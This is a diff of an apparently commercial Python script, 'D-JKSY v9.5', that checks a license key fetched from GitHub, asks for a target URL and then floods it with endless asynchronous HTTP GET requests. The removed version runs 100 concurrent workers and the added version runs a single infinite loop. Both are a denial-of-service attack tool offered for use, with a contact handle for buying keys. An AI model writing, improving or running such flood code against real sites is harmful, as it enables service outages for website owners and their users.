@@ -4,39 +4,28 @@ from rich.panel import Panel
 
 console = Console()
 
-def check_auth():
-    # Mengambil key dari file keys.txt di repo yang sama
+async def main():
+    # 1. Cek Lisensi Dulu
     r = requests.get("https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt")
     keys = [k.strip() for k in r.text.splitlines()]
     
     os.system('cls' if os.name == 'nt' else 'clear')
-    console.print(Panel("[bold white on red] I AM JOKESKYLS [/][bold red on white] D-JKSY v9.5 [/]", justify="center"))
+    console.print(Panel("[bold white on red] D-JKSY v9.5 BY JOKESKYLS [/]", justify="center"))
     
     key_input = console.input("\n[bold yellow][?][/] Enter License Key: ").strip()
+    
     if key_input in keys:
         console.print("[bold green][+][/] Access Granted!")
-        time.sleep(1)
-        return True
+        # 2. Input Target jika Key Benar
+        url = console.input("[bold cyan][?][/] Target URL: ")
+        console.print(f"[bold red][!][/] Launching Tier S Attack to {url}...")
+        
+        # Contoh fungsi attack sederhana
+        async with aiohttp.ClientSession() as session:
+            while True:
+                try:
+                    async with session.get(url) as resp:
+                        print(f"[*] Packets Sent to {url} | Status: {resp.status}")
+                except: pass
     else:
         console.print("[bold red][!][/] Invalid Key! Contact @nazisme1930")
-        sys.exit()
-
-async def attack(url):
-    # Logika serangan Tier S
-    async with aiohttp.ClientSession() as session:
-        while True:
-            try:
-                async with session.get(url) as response:
-                    pass
-            except: pass
-
-async def main():
-    if check_auth():
-        url = console.input("[bold cyan][?][/] Target URL: ")
-        console.print(f"[bold green][*][/] Launching Tier S Attack to {url}...")
-        # Menjalankan 100 worker secara bersamaan
-        tasks = [attack(url) for _ in range(100)]
-        await asyncio.gather(*tasks)
-
-if __name__ == "__main__":
-    asyncio.run(main())
